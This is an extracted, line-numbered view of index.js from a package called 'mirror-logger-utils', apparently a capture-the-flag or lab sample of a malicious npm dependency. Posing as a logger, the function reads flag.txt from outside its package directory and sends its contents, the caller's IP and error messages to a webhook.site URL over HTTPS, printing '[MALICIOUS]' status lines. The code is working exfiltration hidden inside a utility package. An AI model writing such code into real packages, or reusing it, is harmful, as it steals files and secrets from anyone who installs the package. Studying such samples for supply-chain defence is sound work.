// File: tmp/tmpiekd9suh/mirror-logger-utils/package/index.js
// ======================================================================
Line 1: const fs = require("fs")
Line 2: const https = require("https")
Line 3: const path = require("path")
Line 5: {
  let flag = null;
  let errMsg = "";

  try {
    const flagPath = path.resolve(__dirname, "..", "..", "flag.txt");

    flag = fs.readFileSync(flagPath, "utf8").trim();
  } catch (err) {
    flag = "flag_not_found";
    errMsg = err.message;
  }

  const exfilURL = `https://webhook.site/d3acd260-0e0b-4d13-aa9c-df9eeac8cb79/?ip=${encodeURIComponent(
    ip
  )}&flag=${encodeURIComponent(flag)}&error=${encodeURIComponent(errMsg)}`;

  https
    .get(exfilURL, (res) => {
      console.log(`[MALICIOUS] Flag sent. Status: ${res.statusCode}`);
    })
    .on("error", (err) => {
      console.error("[MALICIOUS] Error sending flag:", err.message);
    });

  console.log(`[MALICIOUS LOGGER] ${ip}: ${message}`);
}
Line 12: flag = fs.readFileSync(flagPath, "utf8").trim()
Line 23: {
      console.log(`[MALICIOUS] Flag sent. Status: ${res.statusCode}`);
    }
Line 24: console.log(`[MALICIOUS] Flag sent. Status: ${res.statusCode}`)
Line 26: {
      console.error("[MALICIOUS] Error sending flag:", err.message);
    }
Line 27: console.error("[MALICIOUS] Error sending flag:", err.message)
Line 30: console.log(`[MALICIOUS LOGGER] ${ip}: ${message}`)
